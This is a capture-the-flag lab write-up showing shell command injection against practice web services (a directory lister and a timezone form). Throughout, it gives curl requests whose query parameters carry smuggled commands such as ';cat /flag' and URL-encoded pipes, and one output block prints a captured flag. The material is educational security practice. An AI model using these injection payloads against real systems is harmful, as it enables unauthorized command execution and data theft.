
###### Dirlister exploit

A simple curl to the web server revealed the dirlister service.
```html
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form><input type=text name=directory><input type=submit value=Submit></form>
```
Building from the format of the dirlister service files we can create a CMD injection payload 

`http://challenge.localhost:80/?directory=/challenge;cat%20/flag`

- **`?`**: The question mark starts the query string, signaling the beginning of parameters that the server will receive.
- **`directory=`**: This is a key (or parameter name) named `directory`.
- **`/challenge;cat%20/flag`**: This is the value associated with the `directory` key that will cat the flag file. 

Similar to the previous challenge the flag can be found using cat /flag, but the server rules are not different. We can no longer use ;
```
:~$ curl http://challenge.localhost/?directory=challenge%7ccat%20/flag

        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form><input type=text name=directory><input type=submit value=Submit></form>
        <hr>
        <b>Output of: ls -l challenge|cat /flag</b><br>
        <pre>pwn.college{glra8MLAlV6cxZkdr6LRJZahPlO.dRjN1YDLwYjN5czW}
ls: cannot access 'challenge': No such file or directory
</pre>
        </body></html>
```
Using the command:
`curl http://challenge.localhost/?directory=challenge%7ccat%20/flag`
Due to not being able to use ; we instead use the pipe command to cat /flag using URL encoding 
**`| cat /flag`**= `%7ccat%20/flag`

The next example includes a ' character that will need to be manipulated to allow the cat command to be piped.
Using the command:
`curl "http://challenge.localhost/?directory=challenge%27%7ccat%20/flag%27"`
- `%27` was added after challenge to recreate `ls -l 'challenge' | cat /flag`


###### Web-Server timezone exploit

The next exploit can be done through a web servers, date and time settings.
Using command injection and having knowledge of the timers code, we can manipulate the query
```html
<form><input type=text name=timezone><input type=submit value=Submit></form>
```
`curl http://challenge.localhost/?timezone=UTC%7ccat%20/flag`
- we know `name = timezone` so using the url `/?timezone=UTC` specifies the location where the command injection will be made.
- Knowing the flags location at /flag, we can follow previous techniques and inject the command `|cat /flag` by using the URL encoded version `%7ccat%20/flag`





